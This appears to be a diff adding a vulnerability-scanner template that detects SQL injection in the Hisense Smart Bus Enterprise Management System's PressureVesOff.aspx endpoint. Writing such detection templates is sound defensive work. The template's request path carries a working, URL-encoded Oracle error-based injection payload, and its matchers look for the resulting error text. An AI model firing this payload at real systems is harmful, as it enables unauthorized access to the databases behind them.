@@ -1,0 +1,27 @@
+id: hisense-pressurevesoff-sqli
+info:
+  name: Hisense Smart Bus Enterprise Management System PressureVesOff.aspx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL injection vulnerability in the Hisense Smart Bus Enterprise Management System's PressureVesOff.aspx endpoint.
+  metadata:
+    fingerprint: Hisense Smart Bus Enterprise Management System
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/YZSoft/Forms/XForm/BM/PressureVesManagement/PressureVesOff.aspx?key=1%27+AND+8768%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%288768%3D8768%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29--+CUzO"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Error Report"
+          - "未知的主机"
+          - "qbxbq1qpbpq"
+          - "SQL"
+          - "SYS.UTL_INADDR"
+        part: body
